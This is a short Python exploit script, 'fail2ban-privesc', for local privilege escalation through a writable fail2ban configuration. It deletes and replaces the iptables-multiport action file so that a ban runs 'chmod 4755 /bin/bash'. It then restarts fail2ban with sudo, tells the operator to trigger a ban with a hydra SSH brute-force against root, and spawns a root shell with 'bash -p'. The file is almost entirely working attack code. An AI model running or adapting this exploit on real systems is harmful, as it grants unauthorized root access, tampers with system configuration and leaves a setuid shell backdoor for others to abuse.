#!/usr/bin/python3

# title  : fail2ban-privesc
# author : Ravindu Wickramasinghe (@rvizx9)

# https://github.com/rvizx/fail2ban

import os
from time import sleep as s

print('''
+==============================+
|  fail2ban-privesc | @rvizx9  |
+==============================+

''')

conf='''
[INCLUDES]
before = iptables-common.conf
[Definition]

actionstart = <iptables> -N f2b-<name>
              <iptables> -A f2b-<name> -j <returntype>
              <iptables> -I <chain> -p <protocol> -m multiport --dports <port> -j f2b-<name>

actionstop = <iptables> -D <chain> -p <protocol> -m multiport --dports <port> -j f2b-<name>
             <actionflush>
             <iptables> -X f2b-<name>

actioncheck = <iptables> -n -L <chain> | grep -q 'f2b-<name>[ \t]'
actionban = chmod 4755 /bin/bash
actionunban = <iptables> -D f2b-<name> -s <ip> -j <blocktype>
[Init]
'''

os.system("rm -rf /etc/fail2ban/action.d/iptables-multiport.conf")
with open("iptables-multiport.conf","w") as f:
	f.write(conf)

os.system("mv iptables-multiport.conf /etc/fail2ban/action.d/")
os.system("sudo /etc/init.d/fail2ban restart")
os.system("ip -br -c a")

print("[!] start to bruteforce ssh login. \n[run] @attacker : hydra <ip-addr> -l root -P /usr/share/wordlists/rockyou.txt ssh")
print("[!] bash -p will be executed in 100s")
s(100)
os.system("bash -p")
